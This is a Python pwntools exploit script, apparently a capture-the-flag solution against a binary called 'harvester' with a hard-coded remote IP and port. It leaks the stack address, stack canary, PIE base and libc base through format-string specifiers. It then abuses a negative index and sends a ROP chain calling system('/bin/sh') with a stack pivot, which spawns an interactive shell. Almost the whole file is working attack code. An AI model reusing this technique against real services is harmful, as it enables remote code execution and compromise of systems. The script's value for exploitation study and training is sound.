#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 44 ./harvester
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./harvester')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '139.59.168.47'
port = int(args.PORT or 31730)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv,aslr=0, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# b *0x0000555555554bbe
b *0x0000555555554e13
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

if args.LOCAL:
    libc = exe.libc
else :
    libc = ELF("./libc.so.6")

def fight(msg):
    io.sendlineafter("> ","1")
    io.sendafter("> ",msg.ljust(5,"\x00"))
    io.recvuntil("Your choice is: ")
    return io.recvline()[:-1]

def invent(idx):
    io.sendlineafter("> ","2")
    io.sendlineafter("> ","y")
    io.sendlineafter("> ",str(idx))

def stare(msg):
    io.sendlineafter("> ","3")
    io.sendlineafter("> ",str(msg))

stack = int(fight("%10$p")[:-7],16)
stack = stack - 0xeca
print hex(stack)

canary = int(fight("%11$p")[:-7],16)
print hex(canary)

base_exe = int(fight("%13$p")[:-7],16)
base_exe = base_exe - 0xeca
print hex(base_exe)

leak = int(fight("%21$p")[:-7],16)
libc.address = leak - libc.sym["__libc_start_main"] - 234 + 3
print hex(libc.address)
# fight("%21$p")

invent(-11)

to_stack = stack + 0xe7a
leave = base_exe + 0xff1

p = p64(libc.search(asm("pop rdi; ret")).next())
p += p64(libc.search("/bin/sh").next())
p += p64(libc.sym['system'])
p += 'a'*16
p += p64(canary)
p += p64(to_stack-8)
p += p64(leave)
stare(p)



io.interactive()
